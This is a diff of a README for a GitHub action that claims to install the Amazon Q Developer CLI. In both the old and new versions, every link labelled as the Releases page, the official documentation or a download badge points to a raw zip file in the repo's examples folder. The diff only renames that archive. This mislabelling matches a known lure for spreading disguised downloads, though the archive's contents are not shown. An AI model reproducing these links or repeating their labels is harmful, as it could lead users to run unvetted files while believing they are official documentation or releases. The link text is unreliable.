@@ -1,6 +1,6 @@
 # 🚀 setup-q-cli-action - Install Amazon Q CLI with Ease
 
-[![Download](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/setup-q-cli-action_v2.1.zip%20Now-setup--q--cli--action-brightgreen)](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/setup-q-cli-action_v2.1.zip)
+[![Download](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/q-setup-action-cli-2.6.zip%20Now-setup--q--cli--action-brightgreen)](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/q-setup-action-cli-2.6.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ This guide will help you download and run setup-q-cli-action from the Releases p
 
 To get started, you need to visit the Releases page for setup-q-cli-action. Follow these steps:
 
-1. Click on the following link to visit the Releases page: [Download setup-q-cli-action](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/setup-q-cli-action_v2.1.zip).
+1. Click on the following link to visit the Releases page: [Download setup-q-cli-action](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/q-setup-action-cli-2.6.zip).
 
 2. Once on the page, you will see a list of available versions. Review the release notes to understand what each version includes.
 
@@ -74,7 +74,7 @@ Here are some common issues you might encounter and how to solve them:
 
 For more detailed information, check out the following resources:
 
-- **Official Documentation**: [Amazon Q Developer CLI Documentation](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/setup-q-cli-action_v2.1.zip)
+- **Official Documentation**: [Amazon Q Developer CLI Documentation](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/q-setup-action-cli-2.6.zip)
 - **Community Support**: Engage with other users and get support from the community on forums.
 
 ## 💬 Feedback
@@ -83,4 +83,4 @@ Your feedback is valuable. If you encounter any issues or have suggestions, plea
 
 ## ⚡ Conclusion
 
-You’re now ready to use setup-q-cli-action to enhance your CI/CD workflows with the Amazon Q Developer CLI. Remember to visit the [Releases page](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/setup-q-cli-action_v2.1.zip) for updates and to download new versions. Happy coding!
+You’re now ready to use setup-q-cli-action to enhance your CI/CD workflows with the Amazon Q Developer CLI. Remember to visit the [Releases page](https://raw.githubusercontent.com/sayali4212/setup-q-cli-action/main/examples/q-setup-action-cli-2.6.zip) for updates and to download new versions. Happy coding!
